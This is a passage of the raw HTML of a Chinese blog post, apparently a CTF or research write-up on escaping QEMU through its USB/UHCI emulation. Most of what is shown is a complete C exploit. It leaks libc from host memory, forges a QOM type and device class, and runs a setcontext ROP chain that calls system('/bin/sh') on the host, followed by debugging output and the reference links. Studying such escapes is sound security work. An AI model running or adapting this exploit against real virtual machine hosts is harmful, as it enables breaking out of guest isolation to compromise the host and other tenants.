class="line">payload[type_base] = 0; //name</span><br><span class="line">payload[type_base+0xb] = dev_addr + (type_base + 0xe) * 8;</span><br><span class="line">payload[type_base+0xc] = 0; //type-&gt;parent_type</span><br><span class="line">payload[type_base+0xd] = dev_addr + 0x8; //type-&gt;class</span><br><span class="line">char *p = &quot;aaaaaa&quot;;</span><br><span class="line">memcpy(&amp;payload[type_base + 0xe],p,strlen(p)+1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arb_write_seq(dev_addr,payload,0x400);</span><br></pre></td></tr></table></figure>
<p>上传到远程环境执行，会有异常提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ # ./exp</span><br><span class="line">.....................</span><br><span class="line">**</span><br><span class="line">ERROR:qom/object.c:167:type_get_parent: assertion failed: (type-&gt;parent_type != NULL)</span><br><span class="line">Bail out! ERROR:qom/object.c:167:type_get_parent: assertion failed: (type-&gt;parent_type != NULL)</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
<p>在<code>qom/object.c</code>的第<code>167</code>行断言失败，结合两处的报错行数，我们确定出了qemu的版本是<code>stable-2.10</code>，那么将该版本的代码下载过来编译，就能尽可能的接近远程的环境。通过调试，确定了<code>klass-&gt;ep_stopped</code>函数指针的偏移，因此我们在对应的位置上伪造好<code>gadgets</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//ep_stopped</span><br><span class="line">payload[0x24] = mov_rdx_qp_rdi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int rop_start = 0x40;</span><br><span class="line">//ROP</span><br><span class="line">payload[0x1] = dev_addr + rop_start*8 ;</span><br><span class="line">//rdx</span><br><span class="line">payload[rop_start+0x4] = set_context;</span><br><span class="line">payload[rop_start+0xa0/0x8] = dev_addr + (rop_start*8+0xb0); //new stack</span><br><span class="line">payload[rop_start+0xa8/0x8] = pop_rdi_rbp;</span><br><span class="line">payload[rop_start+0xb0/0x8] = dev_addr + (rop_start*8+0xc8);</span><br><span class="line">payload[rop_start+0xc0/0x8] = system_addr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char *cmd = &quot;/bin/sh&quot;;</span><br><span class="line">memcpy(&amp;payload[rop_start+0xc8/0x8],cmd,strlen(cmd)+1);</span><br></pre></td></tr></table></figure>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>最终的exp.c如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/io.h&gt;</span><br><span class="line"></span><br><span class="line">#define LOCAL</span><br><span class="line">#ifdef LOCAL</span><br><span class="line">#define ARENA_OFFSET 0x1e3c</span><br><span class="line">00</span><br><span class="line">#define SYSTEM_OFFSET 0x503c0</span><br><span class="line">#define GADGET_OFFSET 0x14b760</span><br><span class="line">#define SETCONTEXT_OFFSET 0x5306d</span><br><span class="line">#define POP_RDI_RBP_OFFSET 0x29522</span><br><span class="line">#else</span><br><span class="line">#define ARENA_OFFSET 0x1e0c00</span><br><span class="line">#define SYSTEM_OFFSET 0x4fa60</span><br><span class="line">#define GADGET_OFFSET 0x14a0a0</span><br><span class="line">#define SETCONTEXT_OFFSET 0x529AD</span><br><span class="line">#define POP_RDI_RBP_OFFSET 0x28db2</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#define PFN_MASK ((((size_t)1)&lt;&lt;54)-1)</span><br><span class="line">#define UHCI_BASE 0xc040</span><br><span class="line"></span><br><span class="line">#define UHCI_CMD_HCRESET (1 &lt;&lt; 1)</span><br><span class="line">#define UHCI_CMD_RS (1 &lt;&lt; 0)</span><br><span class="line"></span><br><span class="line">#define UHCI_PORT_RESET (1 &lt;&lt; 9)</span><br><span class="line">#define UHCI_PORT_EN    (1 &lt;&lt; 2)    //enable</span><br><span class="line">#define UHCI_PORT_CCS   (1 &lt;&lt; 0)</span><br><span class="line"></span><br><span class="line">#define TD_CTRL_ACTIVE  (1 &lt;&lt; 23)</span><br><span class="line">#define TD_CTRL_SPD     (1 &lt;&lt; 29)  //we need this to allow we send more than two</span><br><span class="line"></span><br><span class="line">#define USB_TOKEN_SETUP     0x2d</span><br><span class="line">#define USB_TOKEN_IN        0x69 /* device -&gt; host */</span><br><span class="line">#define USB_TOKEN_OUT       0xe1 /* host -&gt; device */</span><br><span class="line"></span><br><span class="line">#define USB_DIR_OUT         0</span><br><span class="line">#define USB_DIR_IN          0x80</span><br><span class="line"></span><br><span class="line">typedef struct UHCI_TD &#123;</span><br><span class="line">    uint32_t link;</span><br><span class="line">    uint32_t ctrl; /* see TD_CTRL_xxx */</span><br><span class="line">    uint32_t token;</span><br><span class="line">    uint32_t buffer;</span><br><span class="line">&#125; UHCI_TD;</span><br><span class="line"></span><br><span class="line">typedef struct USBEndpoint USBEndpoint;</span><br><span class="line">typedef struct USBDevice USBDevice;</span><br><span class="line"></span><br><span class="line">struct USBEndpoint &#123;</span><br><span class="line">    uint8_t nr;</span><br><span class="line">    uint8_t pid;</span><br><span class="line">    uint8_t type;</span><br><span class="line">    uint8_t ifnum;</span><br><span class="line">    int max_packet_size;</span><br><span class="line">    int max_streams;</span><br><span class="line">    bool pipeline;</span><br><span class="line">    bool halted;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    USBEndpoint *fd;</span><br><span class="line">    USBEndpoint *bk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct USBDevice &#123;</span><br><span class="line">    int32_t remote_wakeup;</span><br><span class="line">    int32_t setup_state;</span><br><span class="line">    int32_t setup_len;</span><br><span class="line">    int32_t setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[15];</span><br><span class="line">    USBEndpoint ep_out[15];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct UHCI_TD * td;</span><br><span class="line">uint32_t *td_phy_addr_in_any_frame;</span><br><span class="line"></span><br><span class="line">char *dmabuf;</span><br><span class="line">unsigned char *data_buf;</span><br><span class="line">uint64_t data_buf_addr;</span><br><span class="line">char *setup_buf;</span><br><span class="line"></span><br><span class="line">void die(char *msg) &#123;</span><br><span class="line">   perror(msg);</span><br><span class="line">   exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">/*向设备写入数据*/</span><br><span class="line">void pmio_write(uint32_t addr,uint32_t val) &#123;</span><br><span class="line">   outl(val,UHCI_BASE + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*从UHCI读取数据*/</span><br><span class="line">uint32_t pmio_read(uint32_t addr) &#123;</span><br><span class="line">   return (uint32_t)inl(UHCI_BASE + addr);</span><br><span class="line">&#125;</span><br><span class="line">//虚拟地址转换为物理地址</span><br><span class="line">size_t get_phys_addr(void *vir_addr) &#123;</span><br><span class="line">   int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); /*打开页映射表*/</span><br><span class="line">   if (fd == -1) &#123;</span><br><span class="line">      die(&quot;open pagemap error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   size_t vir = (size_t)vir_addr;</span><br><span class="line">   // /0x1000获得是第n页的这个n，由于一个记录数据8字节，因此*8，算的的就是该页在文件里的记录的偏移</span><br><span class="line">   size_t offset = vir / 0x1000 * 8;</span><br><span class="line">   if (lseek(fd,offset,SEEK_SET) == -1) &#123;</span><br><span class="line">      die(&quot;lseek pagemap error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   size_t addr;</span><br><span class="line">   if (read(fd,&amp;addr,8) != 8) &#123;</span><br><span class="line">      die(&quot;read pagemap error&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   addr = (addr &amp; PFN_MASK) * 0x1000 + vir % 0x1000;</span><br><span class="line">   return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void init() &#123;</span><br><span class="line">    /* 映射一块dmabufs 也就是dma模式的读写，读写的数据都在这块内存上*/</span><br><span class="line">    dmabuf = mmap(0, 0x6000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    if (dmabuf == MAP_FAILED)</span><br><span class="line">        die(&quot;mmap&quot;);</span><br><span class="line">    /* 上锁，防止被调度 */</span><br><span class="line">    mlock(dmabuf, 0x6000);</span><br><span class="line"></span><br><span class="line">    td = (UHCI_TD *)dmabuf;</span><br><span class="line">    td_phy_addr_in_any_frame = (uint32_t *)(dmabuf + 0x100);</span><br><span class="line"></span><br><span class="line">    setup_buf = dmabuf + 0x300;</span><br><span class="line">    data_buf = dmabuf + 0x1000;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void set_UHCIState() &#123;</span><br><span class="line">    //清空UHCI之前的状态，这样我们在下一次就可以触发定时任务了</span><br><span class="line">    pmio_write(0,UHCI_CMD_HCRESET);</span><br><span class="line">    //初始化USB端口</span><br><span class="line">    for(int i=0x10;i &lt;= 0x1f;i++)</span><br><span class="line">        pmio_write(i, UHCI_PORT_CCS | UHCI_PORT_RESET | UHCI_PORT_EN);</span><br><span class="line">    uint32_t td_phy_addr = get_phys_addr(td);</span><br><span class="line">    *td_phy_addr_in_any_frame = td_phy_addr;</span><br><span class="line">    //pmio_write(6, 0); //设置s-&gt;frnum为0</span><br><span class="line">    pmio_write(8, td_phy_addr); //设置s-&gt;fl_base_addr为td结构体的物理地址</span><br><span class="line">    pmio_write(0, UHCI_CMD_RS);</span><br><span class="line">    sleep(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void init_state() &#123;</span><br><span class="line">    //初始化时，使用正常的长度</span><br><span class="line">    setup_buf[6] = 0xff;</span><br><span class="line">    setup_buf[7] = 0x0;</span><br><span class="line">    td-&gt;link = get_phys_addr(td);</span><br><span class="line">    td-&gt;ctrl = TD_CTRL_ACTIVE | TD_CTRL_SPD;</span><br><span class="line">    td-&gt;token = USB_TOKEN_SETUP | 0x7 &lt;&lt; 21;</span><br><span class="line">    td-&gt;buffer = get_phys_addr(setup_buf);</span><br><span class="line">    puts(&quot;set_UHCIState&quot;);</span><br><span class="line">    set_UHCIState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_length(uint16_t len, uint8_t option)&#123;</span><br><span class="line">    setup_buf[0] = USB_TOKEN_IN | option;</span><br><span class="line">    //set the length</span><br><span class="line">    setup_buf[6] = len &amp; 0xff;</span><br><span class="line">    setup_buf[7] = (len &gt;&gt; 8 ) &amp; 0xff;</span><br><span class="line">    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;</span><br><span class="line">    td-&gt;token = USB_TOKEN_SETUP | 0x7 &lt;&lt; 21;</span><br><span class="line">    td-&gt;buffer = get_phys_addr(setup_buf);</span><br><span class="line">    set_UHCIState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//do_token_in读取数据</span><br><span class="line">void do_copy_read(uint16_t len)&#123;</span><br><span class="line">    //设置token进入do_token_in</span><br><span class="line">    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;</span><br><span class="line">    td-&gt;token =  USB_TOKEN_IN | (len-1) &lt;&lt; 21; //设置p-&gt;iov.size</span><br><span class="line">    td-&gt;buffer = get_phys_addr(data_buf);</span><br><span class="line">    set_UHCIState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//do_token_out写入数据</span><br><span class="line">void do_copy_write(int offset, unsigned int setup_len, unsigned int setup_index, uint16_t len)&#123;</span><br><span class="line">    if (len == 0x11) &#123;</span><br><span class="line">       len = len - 1;</span><br><span class="line">       *(unsigned long *)(data_buf + offset) = 0x0000000200000002; //setup_state覆盖成原先的内容</span><br><span class="line">       *(unsigned int *)(data_buf + 0x8 +offset) = setup_len; //覆盖setup_len</span><br><span class="line">       *(unsigned int *)(data_buf + 0xc+ offset) = setup_index; //覆盖setup_index</span><br><span class="line">    &#125;</span><br><span class="line">    td-&gt;ctrl =  TD_CTRL_ACTIVE | TD_CTRL_SPD;</span><br><span class="line">    td-&gt;token =  USB_TOKEN_OUT | (len-1) &lt;&lt; 21;</span><br><span class="line">    td-&gt;buffer = get_phys_addr(data_buf);</span><br><span class="line">    set_UHCIState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//任意写</span><br><span class="line">void arb_write_seq(uint64_t target_addr, uint64_t *payload,uint64_t len)</span><br><span class="line">&#123;</span><br><span class="line">    //初始化setup_state</span><br><span class="line">    set_length(0x500, USB_DIR_OUT);</span><br><span class="line">    unsigned long offset = target_addr - data_buf_addr;</span><br><span class="line">    //设置越界长度</span><br><span class="line">    set_length(0x1010, USB_DIR_OUT);</span><br><span class="line">    puts(&quot;set index&quot;);</span><br><span class="line">    //getchar();</span><br><span class="line">    //将setup_index设置为0x1000</span><br><span class="line">    do_copy_write(0, 0, 0, 0x400);</span><br><span class="line">    do_copy_write(0, 0, 0, 0x400);</span><br><span class="line">    do_copy_write(0, 0, 0, 0x400);</span><br><span class="line">    do_copy_write(0, 0, 0, 0x400);</span><br><span class="line">    //覆盖setup_state、setup_len、setup_index</span><br><span class="line">    do_copy_write(0, offset+len, offset-0x10, 0x11);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    memcpy(data_buf,payload,len);</span><br><span class="line">    //puts(&quot;wait&quot;);</span><br><span class="line">    //getchar();</span><br><span class="line">    do_copy_write(0, 0xffff, 0,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   init();</span><br><span class="line">   //申请IO权限</span><br><span class="line">   iopl(3);</span><br><span class="line">   init_state();</span><br><span class="line">   set_length(0x5000,USB_DIR_IN);</span><br><span class="line">   for(int i = 0; i &lt; 4; i++)</span><br><span class="line">        do_copy_read(0x400);  //set index 0x1000</span><br><span class="line">   do_copy_read(0x400);      //read 0x400 to dmabuf</span><br><span class="line"></span><br><span class="line">   struct USBDevice* usb_device_tmp = (struct USBDevice *)(data_buf + 0x4);</span><br><span class="line">   struct USBDevice usb_device;</span><br><span class="line">   memcpy(&amp;usb_device,usb_device_tmp,sizeof(USBDevice));</span><br><span class="line"></span><br><span class="line">   uint64_t dev_addr = (uint64_t)(usb_device.ep_ctl.dev);</span><br><span class="line">   data_buf_addr = dev_addr + 0xdc - 0x8;</span><br><span class="line">   //data_buf_addr = dev_addr + 0xdc;</span><br><span class="line"></span><br><span class="line">   printf(&quot;USBDevice dev_addr: 0x%lx\n&quot;, dev_addr);</span><br><span class="line">   printf(&quot;USBDevice-&gt;data_buf: 0x%lx\n&quot;, data_buf_addr);</span><br><span class="line">   uint64_t *tmp = (uint64_t *)(data_buf + 0x4);</span><br><span class="line">   uint64_t libc_base = -1;</span><br><span class="line">   uint64_t main_arena_xx_addr;</span><br><span class="line">   //搜索main_arena指针</span><br><span class="line">   for (int j=0;j&lt;100;j++) &#123;</span><br><span class="line">      for (int i=0;i&lt;0x400/0x8;i++) &#123;</span><br><span class="line">         main_arena_xx_addr = tmp[i];</span><br><span class="line">         if ((main_arena_xx_addr &gt;&gt; 40) == 0x7f &amp;&amp; ((main_arena_xx_addr &amp; 0xfff) == 0xc00)) &#123;</span><br><span class="line">            //printf(&quot;heap size=0x%lx fd=0x%lx\n&quot;,tmp[i-1],main_arena_xx_addr);</span><br><span class="line">            libc_base = main_arena_xx_addr - ARENA_OFFSET;</span><br><span class="line">            goto outer;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      //write(1,data_buf,0x400);</span><br><span class="line">      do_copy_read(0x400);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   outer:</span><br><span class="line">   if(libc_base == -1)&#123;</span><br><span class="line">       printf(&quot;Error,DO IT AGAIN\n&quot;);</span><br><span class="line">       return 0;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   uint64_t system_addr = libc_base + SYSTEM_OFFSET;</span><br><span class="line">   printf(&quot;leak libc_base address : 0x%lx!\n&quot;, libc_base);</span><br><span class="line">   printf(&quot;leak system_addr address: 0x%lx!\n&quot;, system_addr);</span><br><span class="line">   uint64_t mov_rdx_qp_rdi = libc_base + GADGET_OFFSET; //mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br><span class="line">   uint64_t set_context = libc_base + SETCONTEXT_OFFSET;</span><br><span class="line">   uint64_t pop_rdi_rbp = libc_base + POP_RDI_RBP_OFFSET;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   uint64_t payload[0x400/0x8];</span><br><span class="line"></span><br><span class="line">   int type_base = 0x25;</span><br><span class="line"></span><br><span class="line">   payload[0x0] = dev_addr + 0x10;</span><br><span class="line">   //fake a USBDeviceClass at dev_addr + 0x10</span><br><span class="line">   payload[0x2] = dev_addr + type_base*0x8; //type</span><br><span class="line">   payload[0x9] = dev_addr + 0x8; //bus</span><br><span class="line">   payload[0xe] = dev_addr + 0x8; //port</span><br><span class="line"></span><br><span class="line">   //ep_stopped</span><br><span class="line">   payload[0x24] = mov_rdx_qp_rdi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   int rop_start = 0x40;</span><br><span class="line">   //ROP</span><br><span class="line">   payload[0x1] = dev_addr + rop_start*8 ;</span><br><span class="line">   //rdx</span><br><span class="line">   payload[rop_start+0x4] = set_context;</span><br><span class="line">   payload[rop_start+0xa0/0x8] = dev_addr + (rop_start*8+0xb0); //new stack</span><br><span class="line">   payload[rop_start+0xa8/0x8] = pop_rdi_rbp;</span><br><span class="line">   payload[rop_start+0xb0/0x8] = dev_addr + (rop_start*8+0xc8);</span><br><span class="line">   payload[rop_start+0xc0/0x8] = system_addr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   char *cmd = &quot;/bin/sh&quot;;</span><br><span class="line">   memcpy(&amp;payload[rop_start+0xc8/0x8],cmd,strlen(cmd)+1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   //fake a type</span><br><span class="line">   payload[type_base] = 0; //name</span><br><span class="line">   payload[type_base+0xb] = dev_addr + (type_base + 0xe) * 8;</span><br><span class="line">   payload[type_base+0xc] = 0; //type-&gt;parent_type</span><br><span class="line">   payload[type_base+0xd] = dev_addr + 0x8; //type-&gt;class</span><br><span class="line">   char *p = &quot;usb-device&quot;;</span><br><span class="line">   memcpy(&amp;payload[type_base + 0xe],p,strlen(p)+1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   arb_write_seq(dev_addr,payload,0x400);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/381637468">如何用多种方法利用QEMU漏洞（三）</a></li>
<li><a target="_blank" rel="noopener" href="https://www.pianshen.com/article/91001994244/">PCI&#x2F;PCIe学习——总线结构及配置空间</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/yearn520/article/details/6576875">KVM虚拟机代码揭秘——QEMU的PCI总线与设备（上）</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/lux_veritas/article/details/9383643">QEMU-KVM的初始化与客户系统的执行</a></li>
<li><a target="_blank" rel="noopener" href="https://www.wenwenya.com/anquan/549996.html">CVE-2020-14364-Qemu逃逸漏洞分析及两种利用思路</a></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/QEMU/" rel="tag"># QEMU</a>
              <a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8/" rel="tag"># 虚拟机逃逸</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/10/17/bytectf2021-babydroid/" rel="prev" title="bytectf2021_babydroid">
      <i class="fa fa-chevron-left"></i> bytectf2021_babydroid
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-one/" rel="next" title="鹏城杯2022_one">
      鹏城杯2022_one <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
